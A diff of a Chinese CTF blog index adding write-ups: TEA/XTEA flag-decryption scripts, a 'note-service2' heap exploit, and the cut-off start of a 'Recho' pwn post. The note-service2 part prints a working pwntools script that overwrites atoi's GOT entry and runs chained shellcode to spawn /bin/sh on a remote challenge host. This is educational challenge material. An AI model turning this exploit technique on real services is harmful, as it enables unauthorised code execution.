@@ -128,7 +128,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">52</span></a>
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">53</span></a>
 
   </li>
   </ul>
@@ -154,6 +154,411 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/05/Tea/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Dvgd.jpg">
+      <meta itemprop="name" content="Dvgd">
+      <meta itemprop="description" content="Welcome to my blog.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dvgd">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/08/05/Tea/" class="post-title-link" itemprop="url">Tea</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-08-05 10:32:34" itemprop="dateCreated datePublished" datetime="2023-08-05T10:32:34+08:00">2023-08-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-08-06 22:05:29" itemprop="dateModified" datetime="2023-08-06T22:05:29+08:00">2023-08-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="GDOUCTF-2023-Tea"><a href="#GDOUCTF-2023-Tea" class="headerlink" title="[GDOUCTF 2023]Tea"></a>[GDOUCTF 2023]Tea</h1><p>首先下载，拖进exe查看<img src="/../images/Tea/222da3f37947403e8fac9bd56cf09a6d.png" alt="img"></p>
+<p> 发现为64位，拖进ida64，快捷键shift+f12到<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>然后ctrl+f搜索关键词flag</p>
+<p><img src="/../images/Tea/da0a9fdd239f43f088362ebc3db9b7f1.png" alt="img"></p>
+<p>双击flag跟进 ，找到调用函数sub_140016230，点进去查看函数关键代码。<img src="/../images/Tea/6d24d84c4c5346ee8f417b2f90a18f4b.png" alt="img"></p>
+<p>双击sub_140011339(v7)跟进，然后跟进sub_1400117D0(a1)函数，<img src="/../images/Tea/ae0f734a3dce46bbbf112a82bf88c41f.png" alt="img"></p>
+<p> 可知v7为key，且被更改为{2233，4455，6677，8899}，双击 sub_1400112B7(v8, v7)，跟进sub_140011900(a1, a2)函数，<img src="/../images/Tea/c91d2c54103a48fc91fa71d85acf006c.png" alt="img"></p>
+<p>可知其为tea<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">加密</a>，然后再双击sub_140011352(v8)，跟进sub_140011B60(a1)函数，<img src="/../images/Tea/0f567038a37a4e03b0149e66bb85369c.png" alt="img"></p>
+<p>上述为加密后的数据，接下来就是写脚本</p>
+<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include &lt;stdio.h&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span> </span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">int</span> key[] = &#123;<span class="number">2233</span>, <span class="number">4455</span>, <span class="number">6677</span>, <span class="number">8899</span>&#125;;</span><br><span class="line">	unsigned <span class="built_in">int</span> <span class="keyword">value</span>[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">value</span>[<span class="number">0</span>] = <span class="number">0x1A800BDA</span>;</span><br><span class="line">	<span class="keyword">value</span>[<span class="number">1</span>] = <span class="number">0xF7A6219B</span>;</span><br><span class="line">	<span class="keyword">value</span>[<span class="number">2</span>] = <span class="number">0x491811D8</span>;</span><br><span class="line">	<span class="keyword">value</span>[<span class="number">3</span>] = <span class="number">0xF2013328</span>;</span><br><span class="line">	<span class="keyword">value</span>[<span class="number">4</span>] = <span class="number">0x156C365B</span>;</span><br><span class="line">	<span class="keyword">value</span>[<span class="number">5</span>] = <span class="number">0x3C6EAAD8</span>;</span><br><span class="line">	<span class="keyword">value</span>[<span class="number">6</span>] = <span class="number">0x84D4BF28</span>;</span><br><span class="line">	<span class="keyword">value</span>[<span class="number">7</span>] = <span class="number">0xF11A7EE7</span>;</span><br><span class="line">	<span class="keyword">value</span>[<span class="number">8</span>] = <span class="number">0x3313B252</span>;</span><br><span class="line">	<span class="keyword">value</span>[<span class="number">9</span>] = <span class="number">0xDD9FE279</span>;</span><br><span class="line">	<span class="built_in">int</span> dalte = <span class="number">0xF462900</span>;</span><br><span class="line">	<span class="built_in">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">int</span> wheel;</span><br><span class="line">	<span class="built_in">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 逆算法</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">8</span>; i&gt;=<span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="comment">// 轮数</span></span><br><span class="line">		wheel = <span class="number">33</span>;</span><br><span class="line">      </span><br><span class="line">		sum = dalte * (i+wheel);</span><br><span class="line">		<span class="keyword">while</span>(wheel--)&#123;</span><br><span class="line">			sum -= dalte;</span><br><span class="line">			<span class="keyword">value</span>[i+<span class="number">1</span>] -= (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ (<span class="keyword">value</span>[i] + ((<span class="keyword">value</span>[i] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * <span class="keyword">value</span>[i])));</span><br><span class="line">			<span class="keyword">value</span>[i] -= sum ^ (<span class="keyword">value</span>[i+<span class="number">1</span>] + ((<span class="keyword">value</span>[i+<span class="number">1</span>] &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * <span class="keyword">value</span>[i+<span class="number">1</span>]))) ^ (sum + key[sum&amp;<span class="number">3</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">9</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">		printf(<span class="string">&quot;%x&quot;</span>, <span class="keyword">value</span>[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> <img src="/../images/Tea/9c192ae9b2854516a5d19cecd0a0041b.png" alt="img"></p>
+<p> 将结果借助在线工具转换成文本字符串就可以了<img src="/../images/Tea/7f2f797412c6448f8692a5d33ceeb3a7.png" alt="img"></p>
+<p>故结果为，NSSCTF{hzCtf_94_re666fingcry5641qq}。</p>
+<h1 id="HNCTF-2022-WEEK2-TTTTTTTTTea"><a href="#HNCTF-2022-WEEK2-TTTTTTTTTea" class="headerlink" title="[HNCTF 2022 WEEK2]TTTTTTTTTea"></a>[HNCTF 2022 WEEK2]TTTTTTTTTea</h1><p>题目链接：[NSSCTF - <a target="_blank" rel="noopener" href="https://www.ctfer.vip/problem/2957">HNCTF 2022 WEEK2]TTTTTTTTTea (ctfer.vip)</a></p>
+<p>题目：<a target="_blank" rel="noopener" href="https://nss-1307121815.cos.ap-chengdu.myqcloud.com/821232fa2ce447e0b3724908b900a8be?q-sign-algorithm=sha1&q-ak=AKIDUnqdARRAernSrzrTothETSAcmgJfkY6O&q-sign-time=1670149528;1670153188&q-key-time=1670149528;1670153188&q-header-list=&q-url-param-list=response-content-disposition&q-signature=13e679a6c66eeb57c5835ac3f65a3af797c704cc&response-content-disposition=attachment;filename=TTT.exe">下载</a></p>
+<p>简单xtea加密学习</p>
+<p>拖入IDA，主函数查看代码<img src="/../images/Tea/2341466f8b1c4608be29a21b74b08f38.png" alt="img"></p>
+<p>分析：把flag放入v4数组中，然后经过tea_encrypt加密后和v4数组前6个数组分别对应相等，进入加密函数，<img src="/../images/Tea/14cffdffc75948fc90624a4fe873ea71.png" alt="img"></p>
+<p> 可以发现是xtea加密，所以直接求flag即可。注意：key数组为4字节，所以数据变为dd类型(类型处按d即可)</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> l,r;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> ciphertext[<span class="number">6</span>]=&#123;<span class="number">-1054939302</span>,<span class="number">-1532163725</span>,<span class="number">-165900264</span>,<span class="number">853769165</span>,<span class="number">768352038</span>,<span class="number">876839116</span>&#125;;</span><br><span class="line">	<span class="type">int</span> flag[<span class="number">6</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> delta;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">4</span>]=&#123;<span class="number">0x00010203</span>,<span class="number">0x04050607</span>,<span class="number">0x08090a0b</span>,<span class="number">0x0c0d0e0f</span>&#125;;</span><br><span class="line">	<span class="type">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">		l=ciphertext[i];</span><br><span class="line">		r=ciphertext[i+<span class="number">1</span>];</span><br><span class="line">		delta=<span class="number">-32</span>*<span class="number">1640531527</span>;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">32</span>;j++)&#123;</span><br><span class="line">			r -= (((l &gt;&gt; <span class="number">5</span>) ^ (l*<span class="number">16</span>)) + l) ^ (key[(delta&gt;&gt;<span class="number">11</span>)&amp;<span class="number">3</span>]+ delta);<span class="comment">//*16==&lt;&lt;4 </span></span><br><span class="line">    		delta += <span class="number">1640531527</span>;</span><br><span class="line">    		l -= (((r &gt;&gt; <span class="number">5</span>) ^ (r*<span class="number">16</span>)) + r) ^ (key[delta&amp;<span class="number">3</span>]+ delta);</span><br><span class="line">		&#125;</span><br><span class="line">		flag[i]=l;</span><br><span class="line">		flag[i+<span class="number">1</span>]=r;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">char</span> *p = (<span class="type">char</span>*)flag;</span><br><span class="line">	<span class="comment">//for(i=0;i&lt;6;i++)</span></span><br><span class="line">	<span class="comment">//	printf(&quot;%#x&quot;,flag[i]);</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">24</span>;i++)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,*p);</span><br><span class="line">		p++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/31/heap2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Dvgd.jpg">
+      <meta itemprop="name" content="Dvgd">
+      <meta itemprop="description" content="Welcome to my blog.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dvgd">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/07/31/heap2/" class="post-title-link" itemprop="url">note-service2</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-07-31 20:32:21 / 修改时间：20:38:16" itemprop="dateCreated datePublished" datetime="2023-07-31T20:32:21+08:00">2023-07-31</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="攻防世界PWN之note-service2题解"><a href="#攻防世界PWN之note-service2题解" class="headerlink" title="攻防世界PWN之note-service2题解"></a>攻防世界PWN之note-service2题解</h1><p>首先看一下程序的保护机制，注意，PIE是开启的，这个checksec检测PIE有时候不准确。不过，我们看到NX是关闭的，说明堆栈的数据可以被当做指令执行</p>
+<p><img src="/../images/note-service2/20191110222658445.png" alt="img"></p>
+<p>然后，我们用IDA分析一下,发现是一个很简单程序，并且只有添加和删除功能，其他功能未实现</p>
+<p><img src="/../images/note-service2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYQ==,size_16,color_FFFFFF,t_70.png" alt="img"></p>
+<p>创建这里，有三处值得我们注意</p>
+<p><img src="/../images/note-service2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYQ==,size_16,color_FFFFFF,t_70-16908067987563.png" alt="img"></p>
+<ol>
+<li>创建的堆空间大小最多为8字节</li>
+<li>保存堆指针的数组下标可以越界</li>
+</ol>
+<p>既然数组下标可以越界，那么我们就可以把任意的地方的8字节数据写成新建的堆的地址指针</p>
+<p>那么，通过数组越界，我们可以把一些函数的GOT表内容修改为堆指针，由于程序NX保护是关闭的，那么堆栈里的数据也可以当成指令执行。那么我们在堆里布置shellcode即可</p>
+<p>有一点需要注意的是，我们的堆空间最多为8字节，并且我们最多向里面输入7字节数据</p>
+<p><img src="/../images/note-service2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYQ==,size_16,color_FFFFFF,t_70-16908067987574.jpeg" alt="img"></p>
+<p>而我们的shellcode最少也要十几字节，因此，我们把shellcode分开，存储到多个堆里，然后在每个堆的最后2字节空间，填上jmp short xxxx指令，让它跳转到下一个堆里去执行代码。</p>
+<p>Jmp short xxxx指令占用2字节，并且，这条指令使用的是相对当前代码位置寻址， 为了发现规律，我们找几个现成的指令看看</p>
+<p><img src="/../images/note-service2/20191110222825992.png" alt="img"></p>
+<p>看看它们的十六进制</p>
+<p><img src="/../images/note-service2/20191110222837422.png" alt="img"></p>
+<p>首先，我们计算第一个看看</p>
+<p>0xE94 + 0x3B &#x3D; 0xECF</p>
+<p>0xEA0 + 0x2F &#x3D; 0xECF</p>
+<p>结果与目标地址还差2，因此，我们推断jmp short xxx中的xxx计算公式</p>
+<p>xxx &#x3D; 目标地址-当前地址-2</p>
+<p>经过试验和查阅资料，发现确实如此。</p>
+<p>由于我们创建堆的时候是按顺序创建下来的，并且期间没有进行删除操作，我们的堆统一为8字节(根据64位堆的数据结构，至少保证有prev_size、size、fd、bk的空间，实际上的大小为8 align to 32 &#x3D; 32字节)，并且，使用中的堆块的fd和bk被当成数据区，因此我们的数据是从这里开始的，导致后面还有0x8字节空数据。</p>
+<table>
+<thead>
+<tr>
+<th>Chunk0</th>
+<th>Prev_size</th>
+<th>0x8字节</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>size</td>
+<td>0x8字节</td>
+<td></td>
+</tr>
+<tr>
+<td>0x5字节 xxxx</td>
+<td>Chunk0的数据区0x8字节</td>
+<td></td>
+</tr>
+<tr>
+<td>(2字节) Jmp short next</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>0空数据(1字节)</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>0x20-83 &#x3D; 0x8字节空数据</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Chunk1</td>
+<td>Prev_size</td>
+<td>0x8字节</td>
+</tr>
+<tr>
+<td>Size</td>
+<td>0x8字节</td>
+<td></td>
+</tr>
+<tr>
+<td>0x5字节 xxxx</td>
+<td>Chunk1的数据区</td>
+<td></td>
+</tr>
+<tr>
+<td>(2字节) Jmp short next</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>0空数据(1字节)</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>0x20-83 &#x3D; 0x8字节空数据</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>现在我们想从chunk0的jmp出跳到chunk1的data处执行新代码，那么我们jmp short后面的偏移为</p>
+<p>注意那个末尾的1字节0，是输入函数给我们加上的，我们真正只能使用data区的7个字节，也就是我们的每个块里最多放7个字节的指令</p>
+<p>Jmp short后面的next值的计算</p>
+<p>next &#x3D; (8 + 8 + 8 + 1 + 2 - 2) &#x3D; 0x19</p>
+<p>现在我们就开始在堆里构造shellcode，我们的目的是在几个堆里构造处这样的代码</p>
+<ol>
+<li>;64位系统调用 </li>
+<li>mov rdi,xxxx;&#x2F;bin&#x2F;sh字符串的地址 </li>
+<li>mov rax,59;execve的系统调用号 </li>
+<li>mov rsi,0; </li>
+<li>mov rdx,0 </li>
+<li>syscall</li>
+</ol>
+<p>关键是rdi的值，在这里，如果我们将atoi的got表内容指向我们的第一个堆空间</p>
+<p><img src="/../images/note-service2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYQ==,size_16,color_FFFFFF,t_70-16908067987575.png" alt="img"></p>
+<p><img src="/../images/note-service2/20191110222931377.png" alt="img"></p>
+<p>那么当我们下一次输入选项时，我们输入&#x2F;bin&#x2F;sh就直接get到了shell</p>
+<p>因此，我们决定修改atoi的got表，让它指向我们的第一个堆</p>
+<p>但是，修改atoi的GOT表操作必须放到最后一步，因为我们修改atoi的got表后，就不能再做其他功能了，因为输入选项不再有效，想想为什么？</p>
+<p>但是，我们又得保证最后创建的那个堆位于其他几个堆的开头，即位于第一个堆，那么就可以先事先创建第一个堆用来占用那个空间，最后的时候delete掉后再申请回来(fastbin特性)，通过数组越界把它的指针存到atoi的GOT表里。</p>
+<p>那么atoi的GOT表和<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%95%B0%E7%BB%84&spm=1001.2101.3001.7020">数组</a>下标的关系是什么呢？</p>
+<p>我们的数组的静态地址在这</p>
+<p><img src="/../images/note-service2/20191110222946756.png" alt="img"></p>
+<p>然后，atoi的GOT表静态地址在这</p>
+<p><img src="/../images/note-service2/20191110223002480.png" alt="img"></p>
+<p>两者相差0x40字节,0x40 &#x2F; 8 &#x3D; 8字节，也就是说,数组下标-8处就是atoi的GOT表</p>
+<p>综上，我们的exp脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *    </span><br><span class="line">p = remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">58097</span>)  </span><br><span class="line">elf=ELF(<span class="string">&#x27;./f&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,content</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line">	p.sendafter(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">code1=asm(<span class="string">&#x27;xor rsi,rsi&#x27;</span>).ljust(<span class="number">5</span>,<span class="string">b&#x27;\x90&#x27;</span>)+<span class="string">b&#x27;\xeb\x19&#x27;</span></span><br><span class="line">code2=asm(<span class="string">&#x27;xor rdx,rdx&#x27;</span>).ljust(<span class="number">5</span>,<span class="string">b&#x27;\x90&#x27;</span>)+<span class="string">b&#x27;\xeb\x19&#x27;</span></span><br><span class="line">code3=asm(<span class="string">&#x27;mov eax,0x3b&#x27;</span>).ljust(<span class="number">5</span>,<span class="string">b&#x27;\x90&#x27;</span>)+<span class="string">b&#x27;\xeb\x19&#x27;</span></span><br><span class="line">code4=asm(<span class="string">&#x27;syscall&#x27;</span>).ljust(<span class="number">7</span>,<span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,code1)</span><br><span class="line">add(<span class="number">1</span>,code1)</span><br><span class="line">add(<span class="number">2</span>,code2)</span><br><span class="line">add(<span class="number">3</span>,code3)</span><br><span class="line">add(<span class="number">4</span>,code4)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#把第一个堆块申请回来，存入指令，并且把堆指针赋值给数组的-8下标处(atoi的GOT表处)，即修改了atoi的GOT表</span></span><br><span class="line">add(-<span class="number">8</span>,code1)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()  </span><br></pre></td></tr></table></figure>
+
+<p>脚本中，某些指令有一些技巧，我们必须腾出2字节用于jmp，而某些指令一条就会占用7字节，因此我们换成其他指令，比如mov rsi,0这条指令，我们换成xor rsi,rsi，就有空间来写jmp指令了。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/31/Recho/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Dvgd.jpg">
+      <meta itemprop="name" content="Dvgd">
+      <meta itemprop="description" content="Welcome to my blog.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dvgd">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/07/31/Recho/" class="post-title-link" itemprop="url">Recho</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-07-31 10:37:18 / 修改时间：15:18:26" itemprop="dateCreated datePublished" datetime="2023-07-31T10:37:18+08:00">2023-07-31</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>先来看看文件机制：</p>
+<p><img src="/../images/Recho/image-20230731125223546.png" alt="image-20230731125223546"></p>
+<p>Ida64 位查看</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">Init</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Welcome to Recho server!\n&quot;</span>, <span class="number">0x19</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">read</span>(<span class="number">0</span>, nptr, <span class="number">0x10</span>uLL) &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = <span class="built_in">atoi</span>(nptr);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">15</span> )</span><br><span class="line">      v7 = <span class="number">16</span>;</span><br><span class="line">    v6 = <span class="built_in">read</span>(<span class="number">0</span>, buf, v7);</span><br><span class="line">    buf[v6] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p> 注意这个while循环，导致该程序一直运行，无法退出进程（read 返回值恒为正）… 刚开始很懵逼，只能去上网看看大佬们写的，发现了 shutdown 函数…. 退出循环主要是利用 pwntools 提供的一个功能：shutdown。这个功能可以关闭流，这样就可以 退出循环了。 </p>
